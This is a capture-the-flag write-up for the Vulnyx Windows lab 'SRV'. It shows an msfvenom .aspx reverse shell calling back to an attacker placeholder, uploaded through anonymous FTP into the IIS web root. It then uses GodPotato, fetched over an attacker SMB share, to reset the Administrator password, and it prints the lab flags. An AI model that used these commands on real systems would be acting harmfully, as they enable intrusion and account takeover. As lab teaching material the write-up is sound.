# Vulnyx: SRV

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `msfvenom` · `ftp` · `nc` · `impacket-smbserver` · `GodPotato` · `nxc` · `evil-winrm` |
| **Tags** | `#AnonymousFTP` `#FileUpload` `#RCE` `#SeImpersonatePrivilege` `#PotatoAttack` `#PasswordReset` |
| **URL** | https://vulnyx.com/machines/ |

FTP accepts anonymous uploads, and its root directory turns out to be the same one IIS serves over HTTP — uploading an `.aspx` reverse shell there is enough to get it running directly. The resulting IIS worker process holds `SeImpersonatePrivilege`, abused with `GodPotato` (an alternative to `PrintSpoofer`, useful across a wider range of Windows versions) to reset the local Administrator's password as SYSTEM.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn srv.nyx

PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 128
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49669/tcp open  unknown      syn-ack ttl 128
49670/tcp open  unknown      syn-ack ttl 128
MAC Address: 08:00:27:00:FF:ED (Oracle VirtualBox virtual NIC)
```

A version/script scan against the open ports fills in the details — FTP (21) alongside the usual Windows/IIS spread, and anonymous FTP login is allowed:

```bash
$ sudo nmap -p 21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sCV srv.nyx

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:00:FF:ED (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: SRV, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:00:ff:ed (Oracle VirtualBox virtual NIC)
| smb2-time:
|   date: 2026-08-01T01:10:12
|_  start_date: N/A
|_clock-skew: 9h59m58s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

### Web Enumeration

```
http://srv.nyx/
```

<img src="../Images/srv/Pasted image 20260731174321.png"/>

Two scans run against it — a general wordlist and one built specifically for IIS content. The first turns up an `ftproot` directory, a strong hint that the FTP and web roots overlap:

```bash
$ ffuf -u http://srv.nyx/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php,.html,.txt -ic

aspnet_client           [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 149ms]
ftproot                 [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 27ms]
```

```bash
$ ffuf -u http://srv.nyx/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/IIS.txt -e .php,.html,.txt -ic

aspnet_client/          [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 314ms]
iisstart.htm            [Status: 200, Size: 703, Words: 27, Lines: 32, Duration: 254ms]
iisstart.png            [Status: 200, Size: 99710, Words: 466, Lines: 334, Duration: 274ms]
trace.axd               [Status: 403, Size: 2452, Words: 554, Lines: 58, Duration: 125ms]
```

## Initial Access

### FTP Upload → RCE

An `.aspx` reverse shell is generated with `msfvenom`:

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx > reverse_shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3411 bytes
```

FTP accepts anonymous connections and allows writing, so the shell is uploaded directly:

```bash
$ ftp srv.nyx
Connected to srv.nyx.
220 Microsoft FTP Service
Name (srv.nyx:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put reverse_shell.aspx
local: reverse_shell.aspx remote: reverse_shell.aspx
229 Entering Extended Passive Mode (|||49673|)
150 Opening ASCII mode data connection.
100% |*******************************************************|  3456     2.15 MiB/s    --:-- ETA
226 Transfer complete.
3456 bytes sent in 00:00 (1.19 MiB/s)
```

The `ftproot` directory found earlier confirms it: FTP's root overlaps with IIS's web root, so the uploaded file is immediately requestable over HTTP — and requesting it triggers the shell:

```bash
$ curl http://srv.nyx/ftproot/reverse_shell.aspx
```

### Shell as defaultapppool

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [srv.nyx] 49674
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

The IIS worker account's privileges are checked — `SeImpersonatePrivilege` is enabled, the entry point for a Potato-style escalation:

```cmd
c:\windows\system32\inetsrv> cd %TEMP%

C:\Windows\Temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process         Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
C:\Windows\Temp> systeminfo

Host Name:                 SRV
OS Name:                   Microsoft Windows Server 2019 Standard Evaluation
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:              Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00431-10000-00000-AA871
Original Install Date:     10/10/2025, 9:19:36 AM
System Boot Time:          7/31/2026, 6:04:48 PM
System Manufacturer:       innotek GmbH
System Model:               VirtualBox
System Type:                x64-based PC
Processor(s):               1 Processor(s) Installed.
                            [01]: Intel64 Family 6 Model 78 Stepping 3 GenuineIntel ~2808 Mhz
BIOS Version:                innotek GmbH VirtualBox, 12/1/2006
Windows Directory:          C:\Windows
System Directory:           C:\Windows\system32
Boot Device:                \Device\HarddiskVolume1
System Locale:              en-us;English (United States)
Input Locale:                en-us;English (United States)
Time Zone:                  (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:      2,048 MB
Available Physical Memory:  1,345 MB
Virtual Memory: Max Size:   2,432 MB
Virtual Memory: Available:  1,860 MB
Virtual Memory: In Use:     572 MB
Page File Location(s):      C:\pagefile.sys
Domain:                     WORKGROUP
Logon Server:                N/A
Hotfix(s):                  3 Hotfix(s) Installed.
                            [01]: KB5020627
                            [02]: KB5019966
                            [03]: KB5020374
Network Card(s):            1 NIC(s) Installed.
                            [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                  Connection Name: Ethernet
                                  DHCP Enabled:    Yes
                                  DHCP Server:     10.0.2.3
                                  IP address(es)
                                  [01]: <IP_Victim>
Hyper-V Requirements:       A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

## Privilege Escalation

### `SeImpersonatePrivilege` → GodPotato

`GodPotato` is fetched on the attacker side and hosted over an SMB share for the target to pull from:

```bash
$ wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
$ impacket-smbserver smb . -smb2support
```

`GodPotato` abuses the same class of privilege as `PrintSpoofer` — coercing a SYSTEM-level authentication and impersonating the resulting token — but through a different underlying technique, making it useful across a wider range of Windows versions than tools tied specifically to the Print Spooler service.

```cmd
C:\Windows\Temp> copy \\<ATTACKER_IP>\smb\GodPotato-NET4.exe GodPotato-NET4.exe
        1 file(s) copied.

C:\Windows\Temp> dir
 Volume in drive C has no label.
 Volume Serial Number is 3C1C-3B72

 Directory of C:\Windows\Temp

07/31/2026  06:31 PM    <DIR>          .
07/31/2026  06:31 PM    <DIR>          ..
04/11/2023  06:49 AM            57,344 GodPotato-NET4.exe
07/31/2026  06:06 PM               102 silconfig.log
               2 File(s)         57,446 bytes
               2 Dir(s)  42,992,271,360 bytes free
```

The command run through `GodPotato` resets the local Administrator's password directly, since it executes as SYSTEM:

```cmd
C:\Windows\Temp> .\GodPotato-NET4.exe -cmd "net user Administrator Password123"
[*] CombaseModule: 0x140710295473312
[*] DispatchTable: 0x140710297743472
[*] UseProtseqFunction: 0x140710297119696
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\01b88bbd-a2fb-4170-8b8e-96c1560c5506\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00008c02-0b5f-ffff-c175-d9ac0f4510d0
[*] DCOM obj OXID: 0x9868c150439b3ce
[*] DCOM obj OID: 0xcf8790c2d363a7e
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 732 Token:0x796  User: NT AUTHORITY\SYSTEM  ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2368
The command completed successfully.
```

With a known Administrator password set directly (as SYSTEM), the rest of the box is reachable through standard tooling instead of the raw shell:

```bash
$ nxc smb srv.nyx
SMB         <IP_Victim>     445    SRV              [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV) (domain:SRV) (signing:False) (SMBv1:None)
$ nxc smb srv.nyx -u '' -p ''
SMB         <IP_Victim>     445    SRV              [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV) (domain:SRV) (signing:False) (SMBv1:None)
SMB         <IP_Victim>     445    SRV              [-] SRV\: STATUS_ACCESS_DENIED
$ nxc smb srv.nyx -u 'Administrator' -p 'Password123'
SMB         <IP_Victim>     445    SRV              [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV) (domain:SRV) (signing:False) (SMBv1:None)
SMB         <IP_Victim>     445    SRV              [+] SRV\Administrator:Password123 (Pwn3d!)
$ nxc winrm srv.nyx -u 'Administrator' -p 'Password123'
WINRM       <IP_Victim>     5985   SRV              [*] Windows 10 / Server 2019 Build 17763 (name:SRV) (domain:SRV)
WINRM       <IP_Victim>     5985   SRV              [+] SRV\Administrator:Password123 (Pwn3d!)
```

The `(Pwn3d!)` marker on both confirms the reset password grants full access — WinRM included, which means a clean interactive shell.

### Shell as Administrator

```bash
$ evil-winrm -i srv.nyx -u 'Administrator' -p 'Password123'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
srv\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/10/2025   7:36 PM                .NET v4.5
d-----        10/10/2025   7:36 PM                .NET v4.5 Classic
d-----        10/10/2025   7:31 PM                Administrator
d-r---        10/10/2025  10:19 AM                Public
-a----         1/4/2026  11:35 AM             70 user.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\user.txt
655b5574747c04b16a8b02658363b481
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users\Administrator\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/4/2026  11:36 AM             70 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
e81ebe1d6bfc2fcd1f640925ca841239
```

> **User flag:** `655b5574747c04b16a8b02658363b481`
> **Root flag:** `e81ebe1d6bfc2fcd1f640925ca841239`

## Takeaways

- An FTP root that overlaps with the web server's document root turns "anonymous write access" directly into "arbitrary file upload RCE" — the two services being on the same box doesn't have to mean they share storage, but it's worth checking for immediately when both are present.
- `SeImpersonatePrivilege` shows up often enough on IIS/service accounts that having more than one "Potato" variant on hand (`PrintSpoofer`, `GodPotato`, and others) matters — different Windows versions and patch levels favor different underlying coercion techniques.
- Resetting a well-known account's password after reaching SYSTEM is a repeatable pattern across this whole set of Windows boxes — it trades a raw shell for clean, tool-friendly access without needing to maintain the original foothold.